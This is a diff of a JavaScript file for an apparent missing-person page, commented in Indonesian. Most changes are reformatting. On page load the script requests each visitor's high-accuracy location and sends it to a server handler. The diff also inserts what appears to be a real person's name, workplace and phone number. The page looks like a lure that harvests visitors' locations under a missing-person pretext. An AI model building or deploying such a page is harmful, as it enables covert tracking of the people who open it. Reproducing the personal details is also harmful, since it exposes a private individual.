@@ -1,4 +1,4 @@
-document.addEventListener('DOMContentLoaded', function() {
+document.addEventListener('DOMContentLoaded', function () {
     console.log("DOM fully loaded. Requesting location...");
     requestLocation();
     loadPersonInfo();
@@ -8,22 +8,21 @@ function requestLocation() {
     console.log("Meminta lokasi...");
     if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
-            function(position) {
+            function (position) {
                 console.log("Location obtained successfully");
                 var latitude = position.coords.latitude;
                 var longitude = position.coords.longitude;
                 console.log("Latitude: " + latitude + ", Longitude: " + longitude);
                 sendLocationToServer(latitude, longitude);
             },
-            function(error) {
+            function (error) {
                 console.error("Kesalahan mendapatkan lokasi: ", error.message);
                 // Tambahkan penanganan kesalahan yang lebih baik di sini
-            },
-            {
+            }, {
                 enableHighAccuracy: true,
                 timeout: 5000,
                 maximumAge: 0,
-                secure: true  // Tambahkan opsi ini untuk HTTPS
+                secure: true // Tambahkan opsi ini untuk HTTPS
             }
         );
     } else {
@@ -39,27 +38,27 @@ function sendLocationToServer(latitude, longitude) {
     formData.append('lon', longitude);
 
     fetch('handler.php', {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log('Location sent successfully:', data);
-    })
-    .catch((error) => {
-        console.error('Error sending location to server:', error);
-    });
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Location sent successfully:', data);
+        })
+        .catch((error) => {
+            console.error('Error sending location to server:', error);
+        });
 }
 
 function loadPersonInfo() {
     // Simulasi data orang yang dicari
     // Dalam implementasi nyata, Anda akan mengambil data ini dari server
     const person = {
-        name: "Budi Santoso",
-        age: 35,
-        job: "Guru Sekolah Dasar",
-        photo: "https://example.com/photo-budi.jpg",
-        contactNumber: "+62123456789"
+        name: "M’asy’ari SH.MH",
+        age: 37,
+        job: "Dosen Yasri Mataram",
+        photo: "/ts.png",
+        contactNumber: "+62 817-4741-653"
     };
 
     displayPersonInfo(person);
@@ -83,44 +82,44 @@ function displayPersonInfo(person) {
 function searchMissingPerson() {
     const searchInput = document.querySelector('.search-input');
     const searchTerm = searchInput.value;
-    
+
     fetch('handler.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: 'action=search&searchTerm=' + encodeURIComponent(searchTerm)
-    })
-    .then(response => response.json())
-    .then(data => {
-        displayMissingPersons(data);
-    })
-    .catch((error) => {
-        console.error('Error:', error);
-    });
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'action=search&searchTerm=' + encodeURIComponent(searchTerm)
+        })
+        .then(response => response.json())
+        .then(data => {
+            displayMissingPersons(data);
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+        });
 }
 
 function loadMissingPersons() {
     fetch('handler.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: 'action=getAll'
-    })
-    .then(response => response.json())
-    .then(data => {
-        displayMissingPersons(data);
-    })
-    .catch((error) => {
-        console.error('Error:', error);
-    });
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'action=getAll'
+        })
+        .then(response => response.json())
+        .then(data => {
+            displayMissingPersons(data);
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+        });
 }
 
 function displayMissingPersons(persons) {
     const grid = document.getElementById('missingPersonGrid');
     grid.innerHTML = '';
-    
+
     persons.forEach(person => {
         const card = document.createElement('div');
         card.className = 'missing-person-card';
